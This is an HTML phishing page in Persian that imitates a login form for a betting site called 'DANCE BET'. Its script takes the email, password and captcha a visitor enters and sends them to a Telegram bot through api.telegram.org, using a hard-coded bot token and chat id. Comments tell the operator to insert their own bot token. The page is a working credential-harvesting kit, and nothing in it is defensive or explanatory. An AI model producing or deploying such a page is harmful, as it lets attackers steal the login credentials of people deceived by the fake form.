<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود به حساب کاربری</title>
    <style>
        body {
            margin: 0;
            font-family: Tahoma, sans-serif;
            background-color: #0f0f0f;
            direction: rtl;
        }
        .header {
            background-color: #000;
            padding: 10px;
            text-align: center;
            border-bottom: 1px solid #c19d42;
        }
        .header img {
            height: 40px;
        }
        .container {
            background-color: #fff;
            max-width: 500px;
            margin: 40px auto;
            padding: 20px;
            border-radius: 10px;
            color: black;
        }
        .container h2 {
            background-color: #0f0f0f;
            color: white;
            margin: -20px -20px 20px -20px;
            padding: 15px;
            border-bottom: 1px solid #333;
            font-size: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #aaa;
            border-radius: 5px;
            font-size: 15px;
        }
        .captcha {
            text-align: center;
            margin-bottom: 20px;
        }
        .captcha img {
            height: 40px;
        }
        button {
            width: 100%;
            background-color: #000;
            color: white;
            padding: 12px;
            border: none;
            font-size: 15px;
            border-radius: 5px;
            cursor: pointer;
        }
        .link {
            text-align: left;
            font-size: 13px;
            color: #666;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://i.imgur.com/BzGQ6fQ.png" alt="DANCE BET Logo">
    </div>
    <div class="container">
        <h2>ورود به حساب کاربری</h2>
        <form onsubmit="sendToTelegram(event)">
            <input id="email" type="text" placeholder="ایمیل">
            <input id="password" type="password" placeholder="رمز عبور">
            <input id="captcha" type="text" placeholder="کد امنیتی">
            <div class="captcha">
                <img src="https://i.imgur.com/gR2Sc3O.png" alt="CAPTCHA">
            </div>
            <button type="submit">ورود به حساب کاربری</button>
        </form>
        <div class="link">بازیابی رمز عبور</div>
    </div>

    <script>
        function sendToTelegram(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const captcha = document.getElementById('captcha').value;

            const token = '
7874856646:AAFdjsl46Foud0-CUlVRfR9mUsPyFKnS2l8'; // اینجا توکن رباتت رو بذار
            const chat_id = '7610374149'; // اینجا chat_id خودتو بذار

            const message = `ورود جدید:\nایمیل: ${email}\nرمز: ${password}\nکد امنیتی: ${captcha}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
                .then(response => {
                    if (response.ok) {
                        alert('اطلاعات ارسال شد!');
                    } else {
                        alert('خطا در ارسال اطلاعات.');
                    }
                })
                .catch(error => {
                    alert('مشکلی پیش اومد!');
                    console.error(error);
                });
        }
    </script>
</body>
            </html>
